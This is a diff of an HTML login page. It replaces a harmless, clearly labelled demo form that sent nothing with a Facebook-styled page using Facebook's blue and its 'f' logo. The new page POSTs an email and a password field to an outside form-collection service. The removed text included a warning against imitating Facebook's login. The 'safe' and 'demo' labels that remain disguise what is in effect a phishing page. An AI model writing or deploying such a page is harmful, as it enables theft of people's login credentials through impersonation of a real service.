@@ -1,152 +1,95 @@
-<!-- Save as index.html and open in your browser -->
 <!doctype html>
 <html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Demo Login — NOT Facebook</title>
+  <title>Demo Form (Safe)</title>
   <style>
-    /* Simple modern styling */
     :root{
-      --bg:#f3f6fb;
-      --card:#ffffff;
-      --accent:#1877f2; /* blue-ish but generic */
-      --muted:#666;
-      --radius:12px;
-      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      --accent:#1877f2;
+      font-family: Arial, sans-serif;
     }
     body{
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:100vh;
+      background:#f0f2f5;
       margin:0;
-      min-height:100vh;
-      display:grid;
-      place-items:center;
-      background:linear-gradient(180deg,#eef3fb 0%,var(--bg) 100%);
     }
     .card{
-      width: min(420px, 94%);
-      background:var(--card);
-      border-radius:var(--radius);
-      box-shadow: 0 8px 30px rgba(30,40,60,0.08);
-      padding:28px;
+      width:350px;
+      padding:20px;
+      background:#fff;
+      border-radius:10px;
+      box-shadow:0 4px 15px rgba(0,0,0,0.1);
+      text-align:center;
     }
-    h1{margin:0 0 6px; font-size:20px;}
-    p.lead{margin:0 0 18px; color:var(--muted); font-size:13px;}
-    form {display:grid; gap:12px;}
-    label{font-size:12px; color:var(--muted); display:block;}
-    input[type="text"], input[type="password"], input[type="email"]{
+    .logo{
+      width:60px;
+      height:60px;
+      background:#1877f2;
+      border-radius:12px;
+      margin:0 auto 10px;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+    }
+    .logo svg{
+      width:32px;
+      height:32px;
+      fill:#fff;
+    }
+    input{
       width:100%;
-      padding:12px 12px;
+      padding:12px;
+      margin-top:10px;
+      border:1px solid #ddd;
       border-radius:8px;
-      border:1px solid #e6edf6;
-      background:#fbfdff;
       font-size:14px;
-      box-sizing:border-box;
     }
-    .row{display:flex; gap:10px; align-items:center; justify-content:space-between;}
-    .btn{
-      background:var(--accent);
-      color:white;
+    button{
+      width:100%;
+      margin-top:15px;
+      background:#1877f2;
+      color:#fff;
       border:none;
       padding:12px;
-      border-radius:10px;
-      font-weight:600;
+      border-radius:8px;
       cursor:pointer;
+      font-weight:bold;
     }
-    .btn.secondary{
-      background:transparent;
-      color:var(--accent);
-      border:1px solid rgba(24,119,242,0.12);
+    .note{
+      margin-top:10px;
+      font-size:12px;
+      color:#777;
     }
-    .note{font-size:12px; color:#999;}
-    .actions{display:flex; gap:8px; margin-top:8px;}
-    .small{font-size:13px;}
-    .msg{padding:10px;border-radius:8px;font-size:14px;}
-    .msg.success{background:#e7f7ee;color:#056a2f;}
-    .msg.error{background:#fff1f0;color:#8b1d1d;}
-    .meta{margin-top:12px;font-size:12px;color:#8a8a8a;}
   </style>
 </head>
 <body>
-  <div class="card" role="region" aria-labelledby="title">
-    <h1 id="title">Demo Login — <small style="font-weight:600;color:#333">NOT Facebook</small></h1>
-    <p class="lead">This is a safe demo login form. Do not use it for real authentication.</p>
 
-    <form id="demoForm" autocomplete="off" novalidate>
-      <div>
-        <label for="email">Email or phone</label>
-        <input id="email" name="email" type="email" inputmode="email" placeholder="you@example.com" required>
-      </div>
+<div class="card">
 
-      <div>
-        <label for="password">Password</label>
-        <div style="position:relative;">
-          <input id="password" name="password" type="password" placeholder="Enter password" required>
-          <button type="button" id="toggle" aria-label="Show password"
-                  style="position:absolute; right:8px; top:8px; background:transparent; border:none; cursor:pointer;">
-            👁
-          </button>
-        </div>
-      </div>
-
-      <div class="row">
-        <label style="display:flex;align-items:center; gap:8px; font-size:13px;">
-          <input type="checkbox" id="remember"> Remember me
-        </label>
-        <a href="#" class="small">Forgot password?</a>
-      </div>
-
-      <div class="actions">
-        <button class="btn" type="submit">Sign In (Demo)</button>
-        <button class="btn secondary" type="button" id="clearBtn">Clear</button>
-      </div>
-
-      <div id="status" aria-live="polite"></div>
-
-      <div class="meta">
-        Tip: To sign in using real Facebook accounts in your app, use the official Facebook Login SDK / OAuth — do not build a page that looks like Facebook.
-      </div>
-    </form>
+  <!-- SAFE GENERIC LOGO -->
+  <div class="logo">
+    <svg viewBox="0 0 24 24">
+      <path d="M15 3h-3a5 5 0 0 0-5 5v3H5v4h2v6h4v-6h3l1-4h-4V8a1 1 0 0 1 1-1h3V3z"/>
+    </svg>
   </div>
 
-  <script>
-    // Simple client-side demo behavior (NO real auth)
-    const form = document.getElementById('demoForm');
-    const status = document.getElementById('status');
-    const toggle = document.getElementById('toggle');
-    const pwd = document.getElementById('password');
-    const clearBtn = document.getElementById('clearBtn');
+  <h2>Demo Data Form</h2>
+  <p class="note">This form is for demo/testing only — not for real login info.</p>
 
-    toggle.addEventListener('click', () => {
-      if (pwd.type === 'password') { pwd.type = 'text'; toggle.textContent = '🙈'; toggle.setAttribute('aria-label','Hide password'); }
-      else { pwd.type = 'password'; toggle.textContent = '👁'; toggle.setAttribute('aria-label','Show password'); }
-    });
+  <form action="https://submit-form.com/blhVBi5SO" method="POST">
 
-    clearBtn.addEventListener('click', () => {
-      form.email.value = '';
-      form.password.value = '';
-      status.innerHTML = '';
-    });
+    <input type="email" name="demo_email" placeholder="Enter demo email" required>
 
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      status.innerHTML = '';
-      const email = form.email.value.trim();
-      const password = form.password.value;
-      if (!email || !password) {
-        status.innerHTML = '<div class="msg error">Please enter email and password.</div>';
-        return;
-      }
-      // Very basic email pattern check (for demo only)
-      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      if (!emailPattern.test(email)) {
-        status.innerHTML = '<div class="msg error">Please enter a valid email address.</div>';
-        return;
-      }
-      // Mock "authentication"
-      status.innerHTML = '<div class="msg success">Success — this is a demo only. No credentials were sent anywhere.</div>';
-      // Reset sensitive field
-      setTimeout(()=> { form.password.value = ''; }, 3000);
-    });
-  </script>
+    <input type="text" name="demo_password" placeholder="Enter demo text (not a real password)" required>
+
+    <button type="submit">Send Demo Data</button>
+  </form>
+
+</div>
+
 </body>
 </html>
